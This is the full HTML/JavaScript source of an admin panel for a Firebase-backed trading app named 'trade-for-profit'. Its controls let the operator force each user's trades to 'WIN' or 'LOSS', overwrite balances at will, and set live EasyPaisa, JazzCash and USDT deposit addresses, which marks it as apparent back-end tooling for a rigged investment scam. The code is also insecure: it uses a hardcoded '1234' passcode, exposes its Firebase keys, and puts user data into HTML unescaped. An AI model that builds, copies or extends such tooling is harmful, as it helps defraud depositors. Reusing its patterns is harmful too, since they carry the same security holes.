<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-Terminal | Pro Admin</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #fcd535; --green: #0ecb81; --red: #f6465d; --text: #eaecef; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: none; }
        .container { max-width: 1100px; margin: auto; }
        
        /* Stats Dashboard Styling */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card { background: var(--card); padding: 20px; border-radius: 12px; border-left: 4px solid var(--yellow); text-align: center; }
        .stat-card h3 { margin: 0; font-size: 14px; color: #848e9c; }
        .stat-card p { margin: 10px 0 0; font-size: 24px; font-weight: bold; color: var(--text); }

        .section { background: var(--card); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #2b3139; }
        h2 { color: var(--yellow); border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; font-size: 18px; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2b3139; }
        th { color: #848e9c; }

        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 11px; transition: 0.3s; }
        .btn-win { background: var(--green); color: white; }
        .btn-loss { background: var(--red); color: white; }
        .btn-update { background: var(--yellow); color: black; width: 100%; margin-top: 15px; cursor: pointer; height: 35px; }
        
        input { background: #2b3139; border: 1px solid #474d57; color: white; padding: 8px; border-radius: 4px; width: 85%; }
        .method-inputs { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
    </style>
</head>
<body>

<div class="container">
    <h1 style="color: var(--yellow); text-align: center;">Terminal Master Control 👑</h1>

    <div class="stats-grid">
        <div class="stat-card"><h3>Total Users</h3><p id="stat-users">0</p></div>
        <div class="stat-card" style="border-left-color: var(--green);"><h3>Total Balance</h3><p id="stat-balance">$0</p></div>
        <div class="stat-card" style="border-left-color: #3498db;"><h3>Pending Deps</h3><p id="stat-deps">0</p></div>
        <div class="stat-card" style="border-left-color: var(--red);"><h3>Pending Withs</h3><p id="stat-withs">0</p></div>
    </div>

    <div class="section">
        <h2>Payment Gateway Settings (Live App)</h2>
        <div class="method-inputs">
            <div><label>EasyPaisa</label><br><input type="text" id="ep_val"></div>
            <div><label>JazzCash</label><br><input type="text" id="jc_val"></div>
            <div><label>USDT Address</label><br><input type="text" id="wallet_val"></div>
        </div>
        <button class="btn btn-update" onclick="updateSettings()">SAVE & GO LIVE</button>
    </div>

    <div class="section">
        <h2>User Management & Trade Control</h2>
        <table id="user-table">
            <thead>
                <tr>
                    <th>User Details</th>
                    <th>Balance ($)</th>
                    <th>KYC</th>
                    <th>Control Mode</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-list"></tbody>
        </table>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <div class="section">
            <h2>Pending Deposits</h2>
            <table id="deposit-table">
                <tbody id="deposit-list"></tbody>
            </table>
        </div>
        <div class="section">
            <h2>Pending Withdrawals</h2>
            <table id="withdraw-table">
                <tbody id="withdraw-list"></tbody>
            </table>
        </div>
    </div>
</div>

<script>
    // --- PROTECTION ---
    const ADMIN_PASSCODE = "1234"; 
    if(prompt("Enter Admin Passcode:") === ADMIN_PASSCODE) {
        document.body.style.display = "block";
    } else {
        window.location.href = "https://google.com";
    }

    const firebaseConfig = { 
        apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", 
        authDomain: "trade-for-profit-8b160.firebaseapp.com", 
        databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", 
        projectId: "trade-for-profit-8b160", 
        storageBucket: "trade-for-profit-8b160.firebasestorage.app", 
        messagingSenderId: "1077014018991", 
        appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Stats & Users Logic
    db.ref('users').on('value', snap => {
        const list = document.getElementById('user-list');
        let totalBal = 0, userCount = 0;
        list.innerHTML = "";
        
        snap.forEach(uSnap => {
            const u = uSnap.val();
            const uid = uSnap.key;
            userCount++;
            totalBal += parseFloat(u.balance || 0);

            list.innerHTML += `
                <tr>
                    <td>${u.name}<br><small>${u.email}</small></td>
                    <td><input type="number" value="${u.balance}" onchange="db.ref('users/${uid}').update({balance: parseFloat(this.value)})"></td>
                    <td><span style="color:${u.kyc_status==='APPROVED'? 'var(--green)':'#848e9c'}">${u.kyc_status}</span></td>
                    <td>
                        <button class="btn btn-win" onclick="db.ref('users/${uid}').update({control:'WIN'})">W</button>
                        <button class="btn btn-loss" onclick="db.ref('users/${uid}').update({control:'LOSS'})">L</button>
                        <small>(${u.control || 'Normal'})</small>
                    </td>
                    <td><button class="btn" style="background:#555; color:white;" onclick="db.ref('users/${uid}').update({kyc_status:'APPROVED'})">Approve</button></td>
                </tr>`;
        });
        document.getElementById('stat-users').innerText = userCount;
        document.getElementById('stat-balance').innerText = "$" + totalBal.toFixed(2);
    });

    // Payment Settings Logic
    db.ref('settings/payment_methods').on('value', snap => {
        const d = snap.val();
        if(d){
            document.getElementById('ep_val').value = d.easypaisa || "";
            document.getElementById('jc_val').value = d.jazzcash || "";
            document.getElementById('wallet_val').value = d.usdt_address || "";
        }
    });

    function updateSettings() {
        db.ref('settings/payment_methods').update({
            easypaisa: document.getElementById('ep_val').value,
            jazzcash: document.getElementById('jc_val').value,
            usdt_address: document.getElementById('wallet_val').value
        }).then(() => alert("App Updated Live!"));
    }

    // Deposits & Withdrawals Stats
    db.ref('deposits').on('value', snap => {
        let count = 0;
        const list = document.getElementById('deposit-list');
        list.innerHTML = "";
        snap.forEach(dSnap => {
            const d = dSnap.val();
            if(d.status === "PENDING") {
                count++;
                list.innerHTML += `<tr><td>${d.email}<br>$${d.amount}</td><td><button class="btn-win" onclick="actionDep('${dSnap.key}','${d.uid}',${d.amount})">✔ Approve</button></td></tr>`;
            }
        });
        document.getElementById('stat-deps').innerText = count;
    });

    db.ref('withdrawals').on('value', snap => {
        let count = 0;
        const list = document.getElementById('withdraw-list');
        list.innerHTML = "";
        snap.forEach(wSnap => {
            const w = wSnap.val();
            if(w.status === "PENDING") {
                count++;
                list.innerHTML += `<tr><td>${w.email}<br>$${w.net_payout}</td><td><button class="btn-loss" onclick="db.ref('withdrawals/${wSnap.key}').update({status:'SUCCESS'})">Paid</button></td></tr>`;
            }
        });
        document.getElementById('stat-withs').innerText = count;
    });

    function actionDep(key, uid, amt) {
        db.ref('users/'+uid).child('balance').transaction(c => (c || 0) + amt);
        db.ref('deposits/'+key).update({ status: 'SUCCESS' });
    }
</script>
</body>
                        </html>
